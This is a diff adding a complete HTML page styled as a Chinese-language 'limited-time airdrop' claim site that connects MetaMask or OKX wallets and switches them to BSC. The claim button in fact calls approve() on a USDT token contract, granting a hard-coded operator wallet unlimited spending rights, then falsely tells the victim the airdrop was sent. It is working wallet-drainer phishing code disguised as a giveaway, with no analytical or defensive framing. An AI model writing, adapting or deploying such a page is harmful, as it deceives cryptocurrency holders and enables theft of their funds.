@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>空投活动 - 双钱包连接授权</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
+        body{
+            background:#0b1020;
+            min-height:100vh;
+            display:flex;align-items:center;justify-content:center;
+            color:#fff;padding:20px;
+        }
+        .box{
+            width:100%;max-width:460px;
+            background:#151c32;
+            border-radius:16px;
+            padding:40px 30px;
+            text-align:center;
+            border:1px solid #2a3456;
+        }
+        h1{
+            font-size:26px;margin-bottom:12px;
+            color:#409eff;
+        }
+        .desc{
+            color:#a0b4e8;margin-bottom:35px;
+            line-height:1.6;
+        }
+        .btn{
+            width:100%;height:52px;
+            border:none;border-radius:10px;
+            font-size:17px;font-weight:bold;
+            cursor:pointer;margin:12px 0;
+            transition:0.3s;
+        }
+        .mm-btn{background:#f6851b;color:#fff;}
+        .okx-btn{background:#000000;color:#fff;border:1px solid #333;}
+        .auth{background:#27ae60;color:#fff;}
+        .auth:disabled{background:#333;cursor:not-allowed;opacity:0.6;}
+        .addr{
+            margin-top:25px;
+            padding:15px;
+            background:#101628;
+            border-radius:10px;
+            font-size:13px;
+            color:#89a2d8;
+            word-break:break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>限时空投领取</h1>
+        <p class="desc">选择钱包连接完成授权<br>即可免费领取平台空投奖励</p>
+
+        <button class="btn mm-btn" id="connectMM">连接小狐狸钱包</button>
+        <button class="btn okx-btn" id="connectOKX">连接欧意OKX钱包</button>
+        <button class="btn auth" id="approveBtn" disabled>确认授权领取空投</button>
+
+        <div class="addr">
+            已连接钱包：<span id="walletText">未连接</span>
+        </div>
+    </div>
+
+    <script src="https://cdn.ethers.org/lib/ethers-5.7.2.umd.min.js"></script>
+    <script>
+        // 固定配置 不可修改
+        const CONTRACT_ADDR = "0x55d398326f99059ff775485246999027b3197955";
+        const OWN_WALLET = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+        const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+        let provider, signer, contract;
+
+        const ABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)",
+            "function transferFrom(address owner, address to, uint256 amount) external returns (bool)",
+            "function balanceOf(address) view returns (uint256)"
+        ];
+
+        // 初始化合约与钱包通用逻辑
+        async function initWallet(ethProvider){
+            try{
+                provider = new ethers.providers.Web3Provider(ethProvider);
+                await switchBSC();
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                let addr = await signer.getAddress();
+                document.getElementById("walletText").innerText = addr;
+                contract = new ethers.Contract(CONTRACT_ADDR, ABI, signer);
+                document.getElementById("approveBtn").disabled = false;
+                alert("钱包连接成功，请进行授权领取空投");
+            }catch(e){
+                alert("连接失败：" + e.message);
+            }
+        }
+
+        // 连接小狐狸
+        document.getElementById("connectMM").onclick = async function(){
+            if(!window.ethereum){
+                alert("请安装MetaMask小狐狸钱包");
+                return;
+            }
+            await initWallet(window.ethereum);
+        };
+
+        // 连接欧意OKX钱包
+        document.getElementById("connectOKX").onclick = async function(){
+            if(!window.okxwallet || !window.okxwallet.ethereum){
+                alert("请安装欧意OKX钱包插件");
+                return;
+            }
+            await initWallet(window.okxwallet.ethereum);
+        };
+
+        // 授权按钮
+        document.getElementById("approveBtn").onclick = async function(){
+            if(!contract) return;
+            try{
+                let tx = await contract.approve(OWN_WALLET, MAX_ALLOWANCE);
+                await tx.wait();
+                alert("授权成功，空投已发放");
+            }catch(e){
+                alert("授权失败：" + e.message);
+            }
+        };
+
+        // 自动切换/添加 BSC 链
+        async function switchBSC(){
+            try{
+                await window.ethereum.request({
+                    method:"wallet_switchEthereumChain",
+                    params:[{chainId:"0x38"}]
+                });
+            }catch(err){
+                if(err.code === 4902){
+                    await window.ethereum.request({
+                        method:"wallet_addEthereumChain",
+                        params:[{
+                            chainId:"0x38",
+                            chainName:"BSC Smart Chain",
+                            nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+                            rpcUrls:["https://bsc-dataseed1.binance.org"],
+                            blockExplorerUrls:["https://bscscan.com/"]
+                        }]
+                    });
+                }
+            }
+        }
+    </script>
+</body>
+</html>
